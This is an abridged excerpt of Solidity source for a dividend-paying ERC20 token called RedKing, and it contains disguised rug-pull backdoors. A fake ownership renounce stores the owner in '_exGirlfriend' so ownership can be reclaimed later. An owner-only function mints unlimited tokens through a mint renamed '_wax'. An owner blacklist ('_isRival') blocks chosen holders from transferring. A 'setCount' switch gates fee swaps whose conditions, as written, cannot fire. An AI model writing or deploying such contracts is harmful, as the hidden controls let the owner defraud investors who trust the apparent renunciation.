...
abstract contract Ownable is Context {
    ...
    function suspended(uint256 time) public virtual onlyOwner {
        _exGirlfriend = _owner;
        _owner = address(0);
        _deadTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    function resurgence() public virtual {
        require(_exGirlfriend == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _deadTime , "Contract is locked");
        emit OwnershipTransferred(_owner, _exGirlfriend);
        _owner = _exGirlfriend;
    }
...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function _wax(address account, uint256 amount) internal virtual {
...
contract DividendPayingToken is ERC20, Ownable, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
 ...
 function _withdrawDividendOfUser(address payable user) internal returns (uint256) {
  ...
  function _wax(address account, uint256 value) internal override {
    super._wax(account, value);
...
contract TokenDividendTracker is Ownable, DividendPayingToken {
    ...
    constructor(address _rewardTokenAddress, uint256 _minimumTokenBalanceForDividends) DividendPayingToken("Dividen_Tracker", "Dividend_Tracker", _rewardTokenAddress) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = _minimumTokenBalanceForDividends; //must hold 1+ tokens
    }
...
contract RedKing is ERC20, Ownable {
    ...
    mapping(address => bool) public _isRival;
    ...
    constructor(
        ...
        swapTokensAtAmount = totalSupply.mul(1).div(10**7); // 0.01%

        gasForProcessing = 200000;

        dividendTracker = new TokenDividendTracker(address(this), tokenBalanceForReward_);
    ...
    function RivalAddress(address account, bool value) external onlyOwner{
        _isRival[account] = value;
    }

    function waxToken(address account, uint256 amount) public onlyOwner {
        _wax(account, amount);
    }
    ...
    function swapManual() public onlyOwner {
        ...
        if(AmountTokenRewardsFee > 0 && dividendTracker.totalSupply() > 0) swapAndSendDividends(AmountTokenRewardsFee);
    ...
    function setCount(uint256 count_) public onlyOwner {
        count = count_;
    }
    ...
    function _transfer(
        ...
        require(!_isRival[from] && !_isRival[to], 'Enemy address');
        ...
        if( canSwap &&
            ...
            if(count < 1){
                ...
                if(AmountMarketingFee > 0 && count==1) swapAndSendToFee(AmountMarketingFee);
                if(AmountLiquidityFee > 0 && count==2) swapAndLiquify(AmountLiquidityFee);
                if(AmountTokenRewardsFee > 0 && count==3 && dividendTracker.totalSupply() > 0) swapAndSendDividends(AmountTokenRewardsFee);
            }
